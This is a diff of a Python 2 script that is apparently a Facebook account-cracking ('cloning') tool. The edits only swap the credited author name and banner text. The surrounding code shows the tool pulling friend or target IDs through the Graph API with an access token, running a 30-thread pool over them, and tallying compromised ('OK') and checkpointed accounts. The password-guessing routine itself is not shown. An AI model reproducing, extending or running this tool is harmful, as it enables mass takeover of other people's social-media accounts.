@@ -261,7 +261,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print "\033[1;97m•◈•══════•◈•\033[1;91mBlackTiger\033[1;97m•◈•══════•◈•"
+		print "\033[1;97m•◈•══════•◈•\033[1;91mAsgharLatif\033[1;97m•◈•══════•◈•"
 		jalan('\033[1;91mGetting IDs \033[1;91m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -271,7 +271,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◈•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;92m•◈•══════••◈•\033[1;91mBlackTiger\033[1;95m•◈•══════••◈•"
+		print "\033[1;92m•◈•══════••◈•\033[1;91mAsgharLatif\033[1;95m•◈•══════••◈•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -299,7 +299,7 @@ def pilih_super():
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
 	print "   \033[1;92m●══════════════════◄►══════════════════●"
 
-	jalan('           \033[1;91mAahil start cloning Wait...')
+	jalan('           \033[1;91mAsghar start cloning Wait...')
 	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 
 
 	def main(arg):
@@ -518,7 +518,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackTiger\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;91m«---•◈•---Developed By Rana Aahil--•◈•---»" #Dev:Rana
+	print "  \033[1;91m«---•◈•---Developed By Asghar Latif--•◈•---»" #Dev:Rana
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 Tiger.py)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
